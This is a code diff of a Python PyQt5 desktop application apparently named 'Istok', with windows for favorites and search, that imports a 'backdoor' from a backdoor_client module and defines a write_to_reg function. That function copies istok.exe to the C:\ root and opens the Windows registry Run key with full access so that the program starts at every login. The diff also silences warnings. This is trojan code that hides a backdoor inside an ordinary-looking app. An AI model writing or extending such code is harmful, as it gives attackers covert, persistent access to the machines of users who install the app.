@@ -4,8 +4,9 @@ import json
 import os
 from PyQt5 import QtWidgets
 import winreg as reg
-import shutil
 from threading import Thread
+import warnings
+warnings.filterwarnings("ignore")
 
 from backdoor_client import backdoor
 from MainIstok import Ui_Istok
@@ -15,9 +16,10 @@ from Favorites import Ui_Favorites
 from Search import Ui_Search
 
 
+
 def write_to_reg():
     #pth = os.path.dirname(os.path.realpath(__file__))
-    shutil.copy2(str(__file__), "C:\\istok.exe")
+    os.popen('copy istok.exe C:\\')
     s_name = "istok.exe"
     address = os.path.join("C:\\", s_name)
     tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
